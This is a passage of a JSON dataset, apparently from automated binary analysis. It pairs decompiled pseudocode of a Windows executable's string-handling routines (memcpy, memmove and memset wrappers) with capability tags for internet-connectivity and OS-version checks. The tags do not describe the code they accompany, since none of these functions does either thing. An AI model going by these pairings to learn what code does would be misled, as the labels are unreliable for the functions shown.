        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n\nvoid fcn.1400a6eb0(char **arg1, char *arg2, int64_t arg3)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    ulong uVar3;\n    char **ppcVar4;\n    ulong arg1_00;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    ulong uStack200;\n    uint64_t uStack192;\n    ulong uStack184;\n    ulong var_10h_2;\n    \n    if (arg2 < 0x10) {\n        if (arg2 == NULL) goto code_r0x0001400a6ed7;\n        pcVar1 = *arg1;\n        if (arg2 == 0x1) {\n            *pcVar1 = arg3;\n            goto code_r0x0001400a6ed7;\n        }\n    }\n    else {\n        if (arg2 >> 0x3e != 0) {\n            ppcVar4 = 0x14010bae0;\n            fcn.1400bd360(0x14010bae0);\n            pcVar1 = arg3 - arg2;\n            if (pcVar1 < 0x10) {\n                pcVar2 = *ppcVar4;\n                if (pcVar1 == 0x1) {\n                    *pcVar2 = *arg2;\n                    ppcVar4[1] = 0x1;\n                    (*ppcVar4)[1] = '\\0';\n                    return;\n                }\n                if (pcVar1 == NULL) {\n                    ppcVar4[1] = NULL;\n                    *pcVar2 = '\\0';\n                    return;\n                }\n            }\n            else {\n                if (pcVar1 >> 0x3e != 0) {\n                    ppcVar4 = 0x14010bae0;\n                    fcn.1400bd360(0x14010bae0);\n                    pcVar1 = arg3 - arg2;\n                    if (pcVar1 < 0x10) {\n                        pcVar2 = *ppcVar4;\n                        if (pcVar1 == 0x1) {\n                            *pcVar2 = *arg2;\n                            ppcVar4[1] = 0x1;\n                            (*ppcVar4)[1] = '\\0';\n                            return;\n                        }\n                        if (pcVar1 == NULL) {\n                            ppcVar4[1] = NULL;\n                            *pcVar2 = '\\0';\n                            return;\n                        }\n                    }\n                    else {\n                        if (pcVar1 >> 0x3e != 0) {\n                            arg1_00 = 0x14010bae0;\n                            fcn.1400bd360(0x14010bae0);\n                            uStack192 = fcn.1400b8050(arg2, arg3);\n                            if (uStack192 < 0x10) {\n                                uStack184 = arg1_00;\n                                fcn.1400a75f0(arg1_00);\n                            }\n                            else {\n                                uVar3 = fcn.1400a9310(arg1_00, &uStack192, 0);\n                                fcn.1400a86c0(arg1_00, uVar3);\n                                fcn.1400a6e40(arg1_00, uStack192);\n                            }\n                            fcn.1400bc660(&uStack200, arg1_00);\n                            uVar3 = fcn.14002fcc0(arg1_00);\n                            fcn.1400a7650(uVar3, arg2, arg3);\n                            uStack200 = 0;\n                            fcn.1400a7600(arg1_00, uStack192);\n                            fcn.1400bc680(&uStack200);\n                            return;\n                        }\n                        pcVar2 = fcn.1400bc710(pcVar1 + 1);\n                        ppcVar4[2] = pcVar1;\n                        *ppcVar4 = pcVar2;\n                    }\n                    sub.msvcrt.dll_memcpy(pcVar2, arg2, pcVar1);\n                    ppcVar4[1] = pcVar1;\n                    (*ppcVar4)[pcVar1] = '\\0';\n                    return;\n                }\n                pcVar2 = fcn.1400bc710(pcVar1 + 1);\n                ppcVar4[2] = pcVar1;\n                *ppcVar4 = pcVar2;\n            }\n            sub.msvcrt.dll_memcpy(pcVar2, arg2, pcVar1);\n            ppcVar4[1] = pcVar1;\n            (*ppcVar4)[pcVar1] = '\\0';\n            return;\n        }\n        pcVar1 = fcn.1400bc710(arg2 + 1);\n        arg1[2] = arg2;\n        *arg1 = pcVar1;\n    }\n    sub.msvcrt.dll_memset(pcVar1, arg3, arg2);\ncode_r0x0001400a6ed7:\n    arg1[1] = arg2;\n    (*arg1)[arg2] = '\\0';\n    return;\n}\n",
        "token_count": 1135
    },
    "1400a718": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a7180(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a9310(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a722": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a7220(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a9310(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a72c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a72c0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a9310(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 277
    },
    "1400a736": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a7360(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a9310(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a7400(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a9310(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a74a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a74a0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int64_t *noname_0;\n    uint64_t uVar3;\n    uint64_t uStack88;\n    uint64_t uStack80;\n    int64_t *piStack72;\n    uchar *puStack64;\n    \n    uStack80 = arg3 - arg2;\n    if (uStack80 < 0x10) {\n        puVar1 = *arg1;\n        if (uStack80 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uStack80 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        if (uStack80 >> 0x3e != 0) {\n            noname_0 = 0x14010bae0;\n            puStack64 = 0x1400a7546;\n            puVar1 = arg2;\n            fcn.1400bd360(0x14010bae0);\n            uVar3 = arg3 - puVar1;\n            uStack88 = uVar3;\n            piStack72 = arg1;\n            puStack64 = arg2;\n            if (uVar3 < 0x10) {\n                puVar2 = *noname_0;\n                if (uVar3 == 1) {\n                    *puVar2 = *puVar1;\n                    noname_0[1] = 1;\n                    *(*noname_0 + 1) = 0;\n                    return;\n                }\n                if (uVar3 == 0) {\n                    noname_0[1] = 0;\n                    *puVar2 = 0;\n                    return;\n                }\n            }\n            else {\n                puVar2 = fcn.1400a9310(noname_0, &stack0xffffffffffffffa8, 0);\n                *noname_0 = puVar2;\n                noname_0[2] = uStack88;\n            }\n            sub.msvcrt.dll_memcpy(puVar2, puVar1, uVar3);\n            noname_0[1] = uStack88;\n            *(*noname_0 + uStack88) = 0;\n            return;\n        }\n        puStack64 = 0x1400a7512;\n        puVar1 = fcn.1400bc710(uStack80 + 1);\n        arg1[2] = uStack80;\n        *arg1 = puVar1;\n    }\n    puStack64 = 0x1400a7527;\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uStack80);\n    arg1[1] = uStack80;\n    *(*arg1 + uStack80) = 0;\n    return;\n}\n",
        "token_count": 667
    },
    "1400a755": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a7550(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uint64_t uStack32;\n    \n    uVar2 = arg3 - arg2;\n    uStack32 = uVar2;\n    if (uVar2 < 0x10) {\n        puVar1 = *arg1;\n        if (uVar2 == 1) {\n            *puVar1 = *arg2;\n            arg1[1] = 1;\n            *(*arg1 + 1) = 0;\n            return;\n        }\n        if (uVar2 == 0) {\n            arg1[1] = 0;\n            *puVar1 = 0;\n            return;\n        }\n    }\n    else {\n        puVar1 = fcn.1400a9310(arg1, &uStack32, 0);\n        *arg1 = puVar1;\n        arg1[2] = uStack32;\n    }\n    sub.msvcrt.dll_memcpy(puVar1, arg2, uVar2);\n    arg1[1] = uStack32;\n    *(*arg1 + uStack32) = 0;\n    return;\n}\n",
        "token_count": 276
    },
    "1400a765": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a7650(uchar *arg1, uchar *arg2, uchar *arg3)\n\n{\n    if (arg3 - arg2 == 1) {\n        *arg1 = *arg2;\n        return;\n    }\n    if (arg3 == arg2) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x00014001e560. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)();\n    return;\n}\n",
        "token_count": 119
    },
    "1400a76a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a76a0(int64_t *arg1, int64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    uchar *puVar1;\n    uint64_t uVar2;\n    uchar *puVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    char in_stack_00000028;\n    \n    iVar5 = arg1[1];\n    if (arg4 <= (arg3 + 0x3fffffffffffffff) - iVar5) {\n        piVar4 = *arg1;\n        uVar6 = (arg4 - arg3) + iVar5;\n        if (piVar4 == arg1 + 2) {\n            uVar2 = 0xf;\n        }\n        else {\n            uVar2 = arg1[2];\n        }\n        if (uVar2 < uVar6) {\n            fcn.1400a9390(arg1, arg2, arg3, 0);\n            piVar4 = *arg1;\n        }\n        else {\n            iVar5 = iVar5 - (arg3 + arg2);\n            if ((iVar5 != 0) && (arg3 != arg4)) {\n                puVar1 = piVar4 + arg3 + arg2;\n                puVar3 = piVar4 + arg4 + arg2;\n                if (iVar5 == 1) {\n                    *puVar3 = *puVar1;\n                    piVar4 = *arg1;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar3, puVar1, iVar5);\n                    piVar4 = *arg1;\n                }\n            }\n        }\n        if (arg4 != 0) {\n            if (arg4 == 1) {\n                *(piVar4 + arg2) = in_stack_00000028;\n                piVar4 = *arg1;\n            }\n            else {\n                sub.msvcrt.dll_memset(piVar4 + arg2, in_stack_00000028, arg4);\n                piVar4 = *arg1;\n            }\n        }\n        arg1[1] = uVar6;\n        *(piVar4 + uVar6) = 0;\n        return arg1;\n    }\n    piVar4 = 0x14010bb9d;\n    fcn.1400bd360(0x14010bb9d);\n    return piVar4;\n}\n",
        "token_count": 530
    },
    "1400a7cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a7cd0(int64_t *arg1, uchar *s)\n\n{\n    uint64_t uVar1;\n    uchar *puVar2;\n    uint64_t uVar3;\n    uchar *puVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    int64_t arg1_00;\n    ulong *puVar9;\n    int64_t iVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    \n    uVar3 = sub.msvcrt.dll_strlen(s);\n    puVar9 = arg1[1];\n    if (uVar3 <= 0x3fffffffffffffffU - puVar9) {\n        piVar6 = *arg1;\n        puVar12 = puVar9 + uVar3;\n        if (piVar6 == arg1 + 2) {\n            puVar4 = 0xf;\n        }\n        else {\n            puVar4 = arg1[2];\n        }\n        if (puVar4 < puVar12) {\n            fcn.1400a9390(arg1, puVar9, 0, s);\n            piVar6 = *arg1;\n        }\n        else if (uVar3 != 0) {\n            if (uVar3 == 1) {\n                *(piVar6 + puVar9) = *s;\n                piVar6 = *arg1;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(piVar6 + puVar9, s);\n                piVar6 = *arg1;\n            }\n        }\n        arg1[1] = puVar12;\n        puVar12[piVar6] = 0;\n        return arg1;\n    }\n    piVar6 = 0x14010bb74;\n    fcn.1400bd360(0x14010bb74);\n    iVar10 = piVar6[1];\n    if (uVar3 <= 0x3fffffffffffffffU - iVar10) {\n        piVar7 = *piVar6;\n        uVar1 = uVar3 + iVar10;\n        if (piVar7 == piVar6 + 2) {\n            uVar5 = 0xf;\n        }\n        else {\n            uVar5 = piVar6[2];\n        }\n        if (uVar5 < uVar1) {\n            fcn.1400a9390(piVar6, iVar10, 0, puVar9);\n            piVar7 = *piVar6;\n        }\n        else if (uVar3 != 0) {\n            if (uVar3 == 1) {\n                *(piVar7 + iVar10) = *puVar9;\n                piVar7 = *piVar6;\n            }\n            else {\n                sub.msvcrt.dll_memcpy();\n                piVar7 = *piVar6;\n            }\n        }\n        piVar6[1] = uVar1;\n        *(piVar7 + uVar1) = 0;\n        return piVar6;\n    }\n    piVar7 = 0x14010bb74;\n    fcn.1400bd360(0x14010bb74);\n    uVar3 = puVar9[1];\n    puVar12 = *puVar9;\n    piVar6 = piVar7[1];\n    if (uVar3 <= 0x3fffffffffffffffU - piVar6) {\n        piVar8 = *piVar7;\n        uVar1 = uVar3 + piVar6;\n        if (piVar8 == piVar7 + 2) {\n            uVar5 = 0xf;\n        }\n        else {\n            uVar5 = piVar7[2];\n        }\n        if (uVar5 < uVar1) {\n            fcn.1400a9390(piVar7, piVar6, 0, puVar12);\n            piVar8 = *piVar7;\n        }\n        else if (uVar3 != 0) {\n            if (uVar3 == 1) {\n                *(piVar8 + piVar6) = *puVar12;\n                piVar8 = *piVar7;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(piVar8 + piVar6, puVar12);\n                piVar8 = *piVar7;\n            }\n        }\n        piVar7[1] = uVar1;\n        *(piVar8 + uVar1) = 0;\n        return piVar7;\n    }\n    piVar7 = 0x14010bb74;\n    fcn.1400bd360(0x14010bb74);\n    uVar1 = piVar6[1];\n    puVar4 = uVar1 - uVar3;\n    if (puVar12 < uVar1 - uVar3) {\n        puVar4 = puVar12;\n    }\n    if (uVar1 < uVar3) {\n        puVar9 = 0x14010bb74;\n        fcn.1400b7b60(0x14010baf8, 0x14010bb74, uVar3, uVar1);\n    }\n    else {\n        puVar9 = piVar7[1];\n        puVar12 = *piVar6 + uVar3;\n        if (puVar4 <= 0x3fffffffffffffff - puVar9) {\n            piVar6 = *piVar7;\n            puVar2 = puVar4 + puVar9;\n            if (piVar6 == piVar7 + 2) {\n                puVar11 = 0xf;\n            }\n            else {\n                puVar11 = piVar7[2];\n            }\n            if (puVar11 < puVar2) {\n                fcn.1400a9390(piVar7, puVar9, 0, puVar12);\n                piVar6 = *piVar7;\n            }\n            else if (puVar4 != NULL) {\n                if (puVar4 == 0x1) {\n                    *(piVar6 + puVar9) = *puVar12;\n                    piVar6 = *piVar7;\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(piVar6 + puVar9, puVar12, puVar4);\n                    piVar6 = *piVar7;\n                }\n            }\n            piVar7[1] = puVar2;\n            puVar2[piVar6] = 0;\n            return piVar7;\n        }\n    }\n    piVar6 = 0x14010bb74;\n    fcn.1400bd360(0x14010bb74);\n    puVar12 = *puVar9;\n    uVar3 = puVar9[1];\n    iVar10 = piVar6[1];\n    if (uVar3 <= 0x3fffffffffffffffU - iVar10) {\n        piVar7 = *piVar6;\n        uVar1 = uVar3 + iVar10;\n        if (piVar7 == piVar6 + 2) {\n            uVar5 = 0xf;\n        }\n        else {\n            uVar5 = piVar6[2];\n        }\n        if (uVar5 < uVar1) {\n            fcn.1400a9390(piVar6, iVar10, 0, puVar12);\n            piVar7 = *piVar6;\n        }\n        else if (uVar3 != 0) {\n            if (uVar3 == 1) {\n                *(piVar7 + iVar10) = *puVar12;\n                piVar7 = *piVar6;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(piVar7 + iVar10, puVar12);\n                piVar7 = *piVar6;\n            }\n        }\n        piVar6[1] = uVar1;\n        *(piVar7 + uVar1) = 0;\n        return piVar6;\n    }\n    arg1_00 = 0x14010bb74;\n    fcn.1400bd360(0x14010bb74);\n    piVar6 = fcn.1400a76a0(arg1_00, *(arg1_00 + 8), 0, iVar10);\n    return piVar6;\n}\n",
        "token_count": 1792
    },
    "1400a913": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a9130(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    iVar2 = arg1[1];\n    iVar1 = arg2 + arg3;\n    if ((iVar2 != iVar1) && (arg3 != 0)) {\n        puVar4 = iVar1 + *arg1;\n        puVar3 = *arg1 + arg2;\n        if (iVar2 - iVar1 == 1) {\n            *puVar3 = *puVar4;\n            iVar2 = arg1[1];\n        }\n        else {\n            sub.msvcrt.dll_memmove(puVar3, puVar4);\n            iVar2 = arg1[1];\n        }\n    }\n    arg1[1] = iVar2 - arg3;\n    *(*arg1 + (iVar2 - arg3)) = 0;\n    return;\n}\n",
        "token_count": 221
    },
    "1400a91c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400a91c0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    int64_t arg2_00;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    \n    arg2_00 = arg1[1];\n    piVar2 = *arg1;\n    uVar1 = arg2_00 + arg3;\n    if (piVar2 == arg1 + 2) {\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = arg1[2];\n    }\n    if (uVar3 < uVar1) {\n        fcn.1400a9390(arg1, arg2_00, 0, arg2);\n        piVar2 = *arg1;\n    }\n    else if (arg3 != 0) {\n        if (arg3 == 1) {\n            *(piVar2 + arg2_00) = *arg2;\n            piVar2 = *arg1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy();\n            piVar2 = *arg1;\n        }\n    }\n    arg1[1] = uVar1;\n    *(piVar2 + uVar1) = 0;\n    return arg1;\n}\n",
        "token_count": 290
    },
    "1400a925": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a9250(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    uchar *puVar2;\n    uint64_t arg3;\n    uint64_t uStack48;\n    \n    if (arg1 == arg2) {\n        return;\n    }\n    puVar2 = *arg1;\n    uVar1 = arg2[1];\n    if (arg1 + 2 == puVar2) {\n        arg3 = 0xf;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg3 < uVar1) {\n        uStack48 = uVar1;\n        puVar2 = fcn.1400a9310(arg1, &uStack48, arg3);\n        if (arg1 + 2 != *arg1) {\n            fcn.1400bc6c0();\n        }\n        *arg1 = puVar2;\n        arg1[2] = uStack48;\n    }\n    else if (uVar1 == 0) goto code_r0x0001400a9283;\n    if (uVar1 == 1) {\n        *puVar2 = **arg2;\n        puVar2 = *arg1;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar2, *arg2, uVar1);\n        puVar2 = *arg1;\n    }\ncode_r0x0001400a9283:\n    arg1[1] = uVar1;\n    puVar2[uVar1] = 0;\n    return;\n}\n",
        "token_count": 345
    },
    "1400a939": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a9390(ulong *arg1, int64_t arg2, int64_t arg3, uchar *arg4)\n\n{\n    uchar *puVar1;\n    ulong *puVar2;\n    uchar *puVar3;\n    ulong arg3_00;\n    int64_t iVar4;\n    int64_t in_stack_00000028;\n    int64_t aiStack80 [2];\n    \n    aiStack80[0] = (in_stack_00000028 - arg3) + arg1[1];\n    iVar4 = arg1[1] - (arg2 + arg3);\n    if (arg1 + 2 == *arg1) {\n        arg3_00 = 0xf;\n    }\n    else {\n        arg3_00 = arg1[2];\n    }\n    puVar3 = fcn.1400a9310(arg1, aiStack80, arg3_00);\n    if (arg2 != 0) {\n        if (arg2 == 1) {\n            *puVar3 = **arg1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, *arg1, arg2);\n        }\n    }\n    if ((arg4 != NULL) && (in_stack_00000028 != 0)) {\n        if (in_stack_00000028 == 1) {\n            puVar3[arg2] = *arg4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2, arg4, in_stack_00000028);\n        }\n    }\n    puVar2 = *arg1;\n    if (iVar4 != 0) {\n        puVar1 = puVar2 + arg2 + arg3;\n        if (iVar4 == 1) {\n            puVar3[arg2 + in_stack_00000028] = *puVar1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + arg2 + in_stack_00000028, puVar1, iVar4);\n        }\n    }\n    if (arg1 + 2 != puVar2) {\n        fcn.1400bc6c0(puVar2);\n    }\n    *arg1 = puVar3;\n    arg1[2] = aiStack80[0];\n    return;\n}\n",
        "token_count": 498
    },
    "1400a973": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a9730(int64_t **arg1, int64_t *arg2)\n\n{\n    uchar uVar1;\n    uchar *puVar2;\n    ulong uVar3;\n    int64_t **ppiVar4;\n    uint64_t uVar5;\n    int64_t **ppiVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uchar *puVar9;\n    ulong unaff_RBP;\n    uint64_t in_R8;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint64_t arg4;\n    uchar auStack232 [32];\n    ulong uStack200;\n    uchar auStack192 [32];\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uchar auStack112 [32];\n    int64_t **ppiStack80;\n    int64_t *piStack72;\n    uchar *puStack64;\n    \n    piStack72 = arg2[1];\n    ppiVar4 = arg1 + 2;\n    *arg1 = ppiVar4;\n    puVar9 = *arg2;\n    if (piStack72 < 0x10) {\n        if (piStack72 == 0x1) {\n            uVar1 = *puVar9;\n            arg1[1] = 0x1;\n            *(arg1 + 2) = uVar1;\n            *(arg1 + 0x11) = 0;\n            return;\n        }\n        if (piStack72 == NULL) {\n            arg1[1] = NULL;\n            *ppiVar4 = 0;\n            return;\n        }\n    }\n    else {\n        if (piStack72 >> 0x3e != 0) {\n            ppiVar6 = 0x14010bae0;\n            puStack64 = 0x1400a97d6;\n            fcn.1400bd360(0x14010bae0);\n            piVar8 = arg2[1];\n            ppiVar4 = ppiVar6 + 2;\n            *ppiVar6 = ppiVar4;\n            puVar2 = *arg2;\n            ppiStack80 = arg1;\n            puStack64 = puVar9;\n            if (piVar8 < 0x10) {\n                if (piVar8 == 0x1) {\n                    uVar1 = *puVar2;\n                    ppiVar6[1] = 0x1;\n                    *(ppiVar6 + 2) = uVar1;\n                    *(ppiVar6 + 0x11) = 0;\n                    return;\n                }\n                if (piVar8 == NULL) {\n                    ppiVar6[1] = NULL;\n                    *ppiVar4 = 0;\n                    return;\n                }\n            }\n            else {\n                if (piVar8 >> 0x3e != 0) {\n                    ppiVar4 = 0x14010bae0;\n                    uStack120 = 0x1400a9886;\n                    fcn.1400bd360(0x14010bae0);\n                    *ppiVar4 = ppiVar4 + 2;\n                    uVar11 = arg2[1];\n                    if (uVar11 < in_R8) {\n                        piVar8 = 0x14010bc3c;\n                        ppiVar4 = 0x14010baf8;\n                        uStack160 = 0x1400a98d1;\n                        fcn.1400b7b60(0x14010baf8, 0x14010bc3c, in_R8, uVar11);\n                        *ppiVar4 = ppiVar4 + 2;\n                        arg4 = piVar8[1];\n                        if (arg4 < in_R8) {\n                            piVar8 = 0x14010bc3c;\n                            ppiVar4 = 0x14010baf8;\n                            uStack200 = 0x1400a992b;\n                            fcn.1400b7b60(0x14010baf8, 0x14010bc3c, in_R8, arg4);\n                            puVar9 = &stack0xffffffffffffff18;\n                            *ppiVar4 = ppiVar4 + 2;\n                            uVar11 = piVar8[1];\n                            if 